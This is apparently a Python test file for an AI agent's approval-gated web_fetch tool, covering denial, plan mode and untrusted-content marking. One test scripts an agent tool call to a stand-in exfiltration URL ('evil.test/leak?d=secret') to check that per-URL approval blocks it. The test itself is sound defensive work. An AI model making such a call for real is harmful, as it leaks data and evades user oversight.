"""web_fetch inside the loop: approval gates the fetch, and plan mode still offers it."""

from __future__ import annotations

from datetime import date

from src.agent.approval import Choice, Decision
from src.agent.events import AgentEvent
from src.agent.loop import Agent
from src.agent.mode import Mode
from src.agent.provider.base import Done, ProviderEvent, TextDelta, ToolCall, ToolCallEvent
from src.agent.tools import default_tools
from src.agent.tools.base import ToolContext
from src.agent.web import FetchResponse

from tests.fakes import FakeFetcher, Gate, MemoryRecorder, RecordingApprover, ScriptedProvider

URL = "https://example.com/docs"


def _page() -> FetchResponse:
    body = b"hello"
    return FetchResponse(URL, 200, "OK", "text/plain", None, body, len(body))


def _make(ctx: ToolContext, decisions: list[Decision], fetcher: FakeFetcher) -> tuple[Agent, ScriptedProvider, RecordingApprover]:
    script: list[list[ProviderEvent | Gate]] = [
        [ToolCallEvent(ToolCall("c1", "web_fetch", {"url": URL})), Done(10, 5)],
        [TextDelta("done"), Done(10, 5)],
    ]
    provider = ScriptedProvider(script, context_window=1000)
    approver = RecordingApprover(decisions)
    agent = Agent(
        provider,
        default_tools(fetcher=fetcher),
        approver,
        ctx,
        25,
        today=lambda: date(2026, 11, 14),
        recorder=MemoryRecorder(),
    )
    return agent, provider, approver


def _ignore(_: AgentEvent) -> None:
    return None


async def test_a_declined_fetch_makes_no_request(ctx: ToolContext) -> None:
    fetcher = FakeFetcher(_page())
    agent, _, approver = _make(ctx, [Decision(Choice.DENY)], fetcher)

    await agent.run_turn("read it", _ignore)

    assert fetcher.calls == []
    assert approver.requests[0].label == f"web_fetch {URL}"
    assert approver.requests[0].preview is not None and approver.requests[0].preview.body == URL


async def test_an_approved_fetch_runs_and_the_model_sees_the_text(ctx: ToolContext) -> None:
    fetcher = FakeFetcher(_page())
    agent, _, _ = _make(ctx, [Decision(Choice.ONCE)], fetcher)

    await agent.run_turn("read it", _ignore)

    assert fetcher.calls == [URL]
    tool = next(m for m in agent.history if m.role == "tool")
    assert tool.content.endswith("hello") and "untrusted" in tool.content


async def test_plan_mode_offers_web_fetch_and_runs_it_after_approval(ctx: ToolContext) -> None:
    fetcher = FakeFetcher(_page())
    agent, provider, approver = _make(ctx, [Decision(Choice.ONCE)], fetcher)
    agent.set_mode(Mode.PLAN)

    await agent.run_turn("read it", _ignore)

    assert "web_fetch" in provider.requests[0][1]
    assert len(approver.requests) == 1
    assert fetcher.calls == [URL]


async def test_always_for_one_url_does_not_approve_another_url(ctx: ToolContext) -> None:
    other = "https://evil.test/leak?d=secret"
    fetcher = FakeFetcher(_page())
    script: list[list[ProviderEvent | Gate]] = [
        [ToolCallEvent(ToolCall("c1", "web_fetch", {"url": URL})), Done(10, 5)],
        [ToolCallEvent(ToolCall("c2", "web_fetch", {"url": URL})), Done(10, 5)],
        [ToolCallEvent(ToolCall("c3", "web_fetch", {"url": other})), Done(10, 5)],
        [TextDelta("done"), Done(10, 5)],
    ]
    approver = RecordingApprover([Decision(Choice.ALWAYS), Decision(Choice.DENY)])
    agent = Agent(
        ScriptedProvider(script, context_window=1000),
        default_tools(fetcher=fetcher),
        approver,
        ctx,
        25,
        today=lambda: date(2026, 11, 14),
        recorder=MemoryRecorder(),
    )

    await agent.run_turn("read it", _ignore)

    assert [r.label for r in approver.requests] == [f"web_fetch {URL}", f"web_fetch {other}"]
    assert fetcher.calls == [URL, URL]
